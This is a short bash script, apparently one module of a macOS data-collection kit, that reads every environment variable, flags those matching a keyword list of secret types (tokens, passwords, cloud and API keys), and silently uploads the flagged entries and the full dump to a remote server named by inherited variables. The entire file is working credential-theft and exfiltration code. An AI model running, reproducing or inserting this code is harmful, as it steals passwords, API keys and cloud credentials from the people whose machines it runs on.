#!/bin/bash
# envvars_mac.sh - inherits H, P, AU, TH from init_mac.sh

KEYWORDS="key secret token pass pwd auth cred api private cert aws azure gcp github gitlab docker kube db database mongo mysql postgres redis smtp mail stripe slack discord"

ALL=$(env | sort)

FLAGGED=""
while IFS= read -r LINE; do
    LOWER=$(echo "$LINE" | tr '[:upper:]' '[:lower:]')
    for KW in $KEYWORDS; do
        if echo "$LOWER" | grep -q "$KW"; then
            FLAGGED="$FLAGGED\n$LINE"
            break
        fi
    done
done <<< "$ALL"

OUT="[FLAGGED - possible secrets]
${FLAGGED:-"(none found)"}

[ALL ENVIRONMENT VARIABLES]
$ALL"

printf "$OUT" | curl -s -X POST "http://$H:$P/store/envvars" \
     -H "Authorization: $AU" \
     -H "Content-Type: text/plain" \
     -H "X-Target: $TH" \
     --data-binary @- >/dev/null 2>&1
